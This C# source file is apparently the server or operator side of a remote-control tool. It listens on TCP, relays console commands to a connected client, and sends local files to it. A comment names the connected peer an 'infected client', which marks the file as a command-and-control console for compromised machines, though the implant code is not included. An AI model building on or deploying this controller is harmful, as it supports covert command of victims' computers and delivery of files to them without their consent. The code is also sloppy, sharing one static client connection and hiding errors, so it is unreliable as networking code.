using System;
using System.Threading.Tasks;
using System.Threading;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
namespace Client
{
    class Server
    {
            
            private TcpListener tcpListener;
            private Thread listenThread;
            private static TcpClient client;

            public Server(string ip, int port)
            {
                Console.WriteLine("Server Starting ....");
                IPAddress IpAdr = IPAddress.Parse(ip);
                this.tcpListener = new TcpListener(IpAdr, port);
                this.listenThread = new Thread(new ThreadStart(ListenForClients));
                this.listenThread.Start();
            }

            private void ListenForClients()
            {
                this.tcpListener.Start();

                while (true)
                {
                    //blocks until a client has connected to the server
                    client = this.tcpListener.AcceptTcpClient();
                    Console.WriteLine("User connected");
                    Thread clientReceiver = new Thread(Receiver);
                    clientReceiver.Start();
                }
            }

            public void Receiver()
            {
                NetworkStream clientStream = client.GetStream(); 
                byte[] _receivdata = new byte[4096];
                ASCIIEncoding encoder = new ASCIIEncoding();
                int bytesRead = 0;
                ///////////////////////////////////
                ///////Wait return from Client:AkA.infected client
                try
                {
                    //blocks until a client sends a message
                    bytesRead = clientStream.Read(_receivdata, 0, 4096);
                }
                catch
                {
                    //a socket error has occured
                    Console.WriteLine("Socket Error");
                }

                if (bytesRead == 0)
                {
                    //the client has disconnected from the server
                    Console.WriteLine("Client Disconnected ...");
                }

                //message has successfully been received
                string ReceivData = encoder.GetString(_receivdata, 0, bytesRead);
                Console.WriteLine("Client : " + ReceivData);       
            }

            public static void MsgStart()
            {
                try
                {
                    NetworkStream clientStream = client.GetStream();
                    ASCIIEncoding encoder = new ASCIIEncoding();
                    bool x = true;
                    string C;
                    while (x)
                    {
                        C = Console.ReadLine();
                        if (C == "ConnectionClose" || C == "ConnectionRetry")
                        {
                            byte[] buffer = encoder.GetBytes(C);
                            clientStream.Write(buffer, 0, buffer.Length);
                            clientStream.Flush();
                            Console.WriteLine("Disconnecting ...");
                            client.GetStream().Close();
                            client.Close();
                            x = false;
                        }
                        else
                        {
                            if (C == "/Exit") { x = false; }
                            else
                            {
                                byte[] buffer = encoder.GetBytes(C);
                                clientStream.Write(buffer, 0, buffer.Length);
                                clientStream.Flush();
                            };

                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error : Msg Crash");
                }

            }

            public static void FileSending(string file_path)
            {
                NetworkStream clientStream = client.GetStream(); 
                  try
                    {
                         /* File reading operation. */
                        byte[] fileNameByte = Encoding.ASCII.GetBytes(file_path);
                         Console.WriteLine("Buffering ...");
                         byte[] fileData = File.ReadAllBytes(file_path); 
                         /* Read & store file byte data in byte array. */
                         byte[] clientData = new byte[4 + fileNameByte.Length + fileData.Length];
                         /* clientData will store complete bytes which will store file name length, file name & file data. */
                         byte[] fileNameLen = BitConverter.GetBytes(fileNameByte.Length);
                         /* File name length’s binary data. */
                         fileNameLen.CopyTo(clientData, 0);
                         fileNameByte.CopyTo(clientData, 4);
                         fileData.CopyTo(clientData, 4 + fileNameByte.Length);
                         /* copy these bytes to a variable with format line [file name length] [file name] [ file content] */

                         /* Trying to connection with server. */
                         Console.WriteLine("File sending...");
                         clientStream.Write(clientData, 0, clientData.Length);
                         clientStream.Flush();
                         /* Data send complete now close socket. */
                         Console.WriteLine("File transferred.");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("SomeThing Went Wrong");
                    } 
            }
            


    }
}